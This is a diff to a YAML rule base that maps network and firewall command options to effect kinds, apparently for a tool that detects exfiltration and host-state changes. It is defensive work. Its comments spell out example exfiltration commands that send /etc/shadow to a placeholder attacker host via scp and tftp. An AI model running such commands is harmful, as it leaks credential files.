@@ -1,4 +1,4 @@
-version: effect-kb/v2
+version: effect-kb/v3
 # ---------------------------------------------------------------------------
 # Network, remote-access and security-tooling commands: net-tools, curl, wget,
 # nc, openssh, plus DNS, reachability, capture/scan, firewall, SMB/LDAP and
@@ -35,21 +35,25 @@ commands:
       - spec: "-n"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
+      # Finding 18: the net-tools route command never receives traffic — it
+      # reads and mutates the local routing table. The family/target selectors
+      # are reads; add/del/gw rewrite kernel routing state that outlives the
+      # invocation, which is Persist, not NetIngress.
       - spec: "-A"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
       - spec: "-net"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: add
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: del
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: gw
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
 
   - name: netstat
     dialect: net-tools
@@ -104,6 +108,14 @@ commands:
       - spec: "-O"
         kind: flag
         effect: {kind: FSWrite, mode: Direct, valueFrom: args}
+      # Finding 33: the documented long spellings of -o/-O. Both write the
+      # response body to a local file, so neither may bind as a plain URL.
+      - spec: "--output"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      - spec: "--remote-name"
+        kind: flag
+        effect: {kind: FSWrite, mode: Direct, valueFrom: args}
       - spec: "-X"
         kind: option
         effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
@@ -114,6 +126,16 @@ commands:
         kind: option
         effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
       - spec: "--data-binary"
+        kind: option
+        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
+      # Finding 36: --data-ascii is curl's documented alias of --data (the
+      # manual's own example is `--data-ascii @file`), and --url-query accepts
+      # the same @file / name@file payload forms. Both read the local file and
+      # ship its bytes, so both must bind the payload read.
+      - spec: "--data-ascii"
+        kind: option
+        effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
+      - spec: "--url-query"
         kind: option
         effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue, fileRef: true}
       - spec: "-H"
@@ -224,6 +246,39 @@ commands:
       - spec: "--dump-header"
         kind: option
         effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      # Finding 82 (pass 52): the remaining documented options that write a
+      # caller-named file. `man curl` describes each as writing to the file it
+      # names — `--libcurl FILE` ("a libcurl-using C source code file written to
+      # the file you specify"), `--trace FILE`/`--trace-ascii FILE` ("the full
+      # trace dump written to FILE"), `--stderr FILE` (redirect stderr),
+      # `--hsts FILE` (the HSTS cache), `--alt-svc FILE` (the alt-svc cache),
+      # `--etag-save FILE` (save ETags) and `--output-dir DIR` (the directory
+      # the transfers are saved in). Without them the write was invisible and
+      # the analysis noted the option as unrecognised.
+      - spec: "--trace"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      - spec: "--trace-ascii"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      - spec: "--libcurl"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      - spec: "--stderr"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      - spec: "--hsts"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      - spec: "--alt-svc"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      - spec: "--etag-save"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      - spec: "--output-dir"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
       - spec: "--config"
         kind: option
         effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
@@ -304,6 +359,13 @@ commands:
       - spec: "--save-cookies"
         kind: option
         effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
+      # Finding 82 (pass 52): `man wget` — "--warc-file= filename … use
+      # filename as the name of the WARC file" — writes a caller-named archive
+      # beside the download, exactly as the documented `-o`/`--output-file` and
+      # `--save-cookies` spellings already do.
+      - spec: "--warc-file"
+        kind: option
+        effect: {kind: FSWrite, mode: Direct, valueFrom: flagValue}
       - spec: "--netrc-file"
         kind: option
         effect: {kind: CredAccess, mode: Direct, valueFrom: flagValue}
@@ -366,10 +428,10 @@ commands:
         effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
       - spec: "-e"
         kind: option
-        effect: {kind: ProcSpawn, mode: Direct, valueFrom: flagValue}
+        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
       - spec: "-c"
         kind: option
-        effect: {kind: ProcSpawn, mode: Direct, valueFrom: flagValue}
+        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
       - spec: "-w"
         kind: option
         effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
@@ -578,7 +640,7 @@ commands:
         effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
       - spec: "-S"
         kind: option
-        effect: {kind: ProcSpawn, mode: Direct, valueFrom: flagValue}
+        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
       - spec: "-T"
         kind: flag
         effect: {kind: NetEgress, mode: Direct, valueFrom: args}
@@ -597,9 +659,14 @@ commands:
       - spec: SRC
         kind: positional
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
+      # `scp SRC [user@]host:path` is an upload: the destination is a network
+      # sink, not a local file (Finding 3). The egress gate keeps it only for a
+      # host-shaped operand, so a local `scp a b` fabricates no egress, while
+      # `scp /etc/shadow attacker.example:/tmp/x` pairs the secret read with the
+      # egress sink the exfiltration control requires.
       - spec: DEST
         kind: positional
-        effect: {kind: FSWrite, mode: Direct, valueFrom: args}
+        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
 
   # -------------------------------------------------------------------------
   # DNS lookup tools. A query is an outbound request; a TSIG key or a batch
@@ -934,9 +1001,20 @@ commands:
       - spec: "-r"
         kind: option
         effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
+      # Finding 91: tftp's `-l file` names the local file of the transfer — the
+      # source of a put, the destination of a get. The row declared it a
+      # valueless flag, so the file was never bound at all: `tftp -p -l
+      # /etc/shadow host` reported only NetEgress, with no FSRead and no
+      # exfiltration pair, and an Exfiltration: Deny policy allowed the upload.
+      # Both directions are real (a put reads the file, a get writes it), and
+      # declaring both is the deny direction for either spelling.
       - spec: "-l"
-        kind: flag
-        effect: {kind: NetEgress, mode: Direct, valueFrom: args}
+        kind: option
+        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
+        also:
+          - kind: FSWrite
+            mode: Direct
+            valueFrom: flagValue
       - spec: "-4"
         kind: flag
         effect: {kind: NetEgress, mode: Direct, valueFrom: args}
@@ -953,6 +1031,12 @@ commands:
   - name: sftp
     dialect: openssh
     params:
+      # Finding 32: `man sftp`: "-S program  Name of the program to use for
+      # the encrypted connection" — an attacker-chosen local program, mirroring
+      # scp's -S.
+      - spec: "-S"
+        kind: option
+        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
       - spec: "-P"
         kind: option
         effect: {kind: NetEgress, mode: Direct, valueFrom: flagValue}
@@ -1032,10 +1116,10 @@ commands:
         effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
       - spec: "-e"
         kind: option
-        effect: {kind: ProcSpawn, mode: Direct, valueFrom: flagValue}
+        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
       - spec: "--exec"
         kind: option
-        effect: {kind: ProcSpawn, mode: Direct, valueFrom: flagValue}
+        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
       - spec: "--sh-exec"
         kind: option
         effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
@@ -1172,45 +1256,79 @@ commands:
   - name: ip
     dialect: net-tools
     params:
+      # Finding 18: `ip` is a local-network-stack tool. The object words
+      # (addr/link/route/rule/neigh/tunnel) select what is inspected and are
+      # reads — `ip route` alone means `ip route show`. The verbs add/del/set
+      # rewrite kernel state that outlives the invocation (a route, an address,
+      # a link flag), which is Persist, not NetIngress: nothing here receives
+      # inbound traffic.
+      #
+      # Residual: the binder binds a positional by VALUE only when it is the
+      # FIRST operand (bind/bind.go's leading-operand match — the rule that
+      # models `nft add`, `git clone`, `systemctl start`), so in the two-word
+      # spelling `ip route add …` only the object word binds and the verb never
+      # does: the mutation reaches Persist for `ip add …`/`ip route`-less
+      # orderings, while `ip route add …` still reports the object's read. The
+      # alternative — declaring the object words Persist — would report every
+      # `ip addr`/`ip link`/`ip route` listing as a host-state change, which is
+      # the over-report the finding's negative controls exist to forbid. Closing
+      # the residual needs a verb slot in the binder (a second positional
+      # matched after the object), i.e. a bind/bind.go change, not a KB one.
       - spec: addr
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: address
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: link
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: route
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: rule
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: neigh
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: tunnel
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: add
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: del
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: set
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
+      # The remaining mutation verbs `ip` documents for its objects
+      # (`ip route flush`, `ip addr change|replace`, `ip link delete`). They are
+      # declared Persist for the same reason as add/del/set: they rewrite
+      # kernel state that outlives the invocation.
+      - spec: delete
+        kind: positional
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
+      - spec: flush
+        kind: positional
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
+      - spec: change
+        kind: positional
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
+      - spec: replace
+        kind: positional
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: show
         kind: positional
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: "-4"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: "-6"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: "-s"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
@@ -1222,50 +1340,57 @@ commands:
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: "-f"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
       - spec: "-n"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
 
   - name: iptables
     dialect: net-tools
     params:
+      # Finding 18: netfilter rows mutate local kernel state — they never
+      # receive inbound traffic. Rule, chain, policy and counter changes are
+      # Persist (they outlive the invocation and survive until reboot or until
+      # a flush); the rule components (-j/-p/-s/-d/--dport/--sport) are the
+      # parts of that same mutation. Only the inspection spellings (-L/-S/-n/
+      # -v/--save) are reads, and -t stays a table selector (FSMeta) so a
+      # listing with an explicit table is not reported as a write.
       - spec: "-A"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--append"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-D"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--delete"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-I"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-R"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-F"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "--flush"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "-P"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-N"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-X"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "-Z"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "-L"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
@@ -1280,71 +1405,78 @@ commands:
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: "-t"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: FSMeta, mode: Direct, valueFrom: flagValue}
       - spec: "-j"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-p"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-s"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-d"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--dport"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--sport"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--save"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: "--restore"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
 
   - name: ip6tables
     dialect: net-tools
     params:
+      # Finding 18: netfilter rows mutate local kernel state — they never
+      # receive inbound traffic. Rule, chain, policy and counter changes are
+      # Persist (they outlive the invocation and survive until reboot or until
+      # a flush); the rule components (-j/-p/-s/-d/--dport/--sport) are the
+      # parts of that same mutation. Only the inspection spellings (-L/-S/-n/
+      # -v/--save) are reads, and -t stays a table selector (FSMeta) so a
+      # listing with an explicit table is not reported as a write.
       - spec: "-A"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--append"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-D"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--delete"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-I"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-R"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-F"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "--flush"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "-P"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-N"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-X"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "-Z"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "-L"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
@@ -1359,53 +1491,56 @@ commands:
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: "-t"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: FSMeta, mode: Direct, valueFrom: flagValue}
       - spec: "-j"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-p"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-s"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-d"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--dport"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--sport"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--save"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: "--restore"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
 
   - name: nft
     dialect: net-tools
     params:
+      # Finding 18: nft edits the in-kernel packet filter. `list` inspects it
+      # (a read); add/insert/delete/flush and a ruleset file (-f) rewrite it,
+      # which is a persistent host-state change, not inbound traffic.
       - spec: list
         kind: positional
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: add
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: insert
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: delete
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: flush
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "-f"
         kind: option
-        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "-j"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
@@ -1422,30 +1557,33 @@ commands:
   - name: ufw
     dialect: net-tools
     params:
+      # Finding 18: a ufw rule is written to the host's persistent filter
+      # configuration, so every verb that adds, relaxes or removes one is
+      # Persist. `status` is the only inspection spelling and stays a read.
       - spec: status
         kind: positional
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: enable
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: disable
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: allow
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: deny
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: delete
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: reset
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: reload
         kind: positional
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "--dry-run"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
@@ -1453,6 +1591,10 @@ commands:
   - name: firewall-cmd
     dialect: net-tools
     params:
+      # Finding 18: firewall-cmd rewrites the zone configuration (and, with
+      # --permanent/--reload, the on-disk policy). Every add/remove and the
+      # permanent/reload pair is Persist; --state/--list-all inspect and --zone
+      # only names the zone addressed, so all three stay reads.
       - spec: "--state"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
@@ -1461,31 +1603,31 @@ commands:
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
       - spec: "--add-port"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--remove-port"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--add-service"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--remove-service"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--add-source"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--add-rich-rule"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: Persist, mode: Direct, valueFrom: flagValue}
       - spec: "--zone"
         kind: option
-        effect: {kind: NetIngress, mode: Direct, valueFrom: flagValue}
+        effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
       - spec: "--permanent"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
       - spec: "--reload"
         kind: flag
-        effect: {kind: NetIngress, mode: Direct, valueFrom: args}
+        effect: {kind: Persist, mode: Direct, valueFrom: args}
 
   # -------------------------------------------------------------------------
   # Capture and scanning tools. Capturing is inbound traffic; a pcap file is
@@ -1514,7 +1656,7 @@ commands:
         effect: {kind: FSRead, mode: Direct, valueFrom: flagValue}
       - spec: "-z"
         kind: option
-        effect: {kind: ProcSpawn, mode: Direct, valueFrom: flagValue}
+        effect: {kind: CodeExec, mode: Direct, valueFrom: flagValue}
       - spec: "-D"
         kind: flag
         effect: {kind: FSRead, mode: Direct, valueFrom: args}
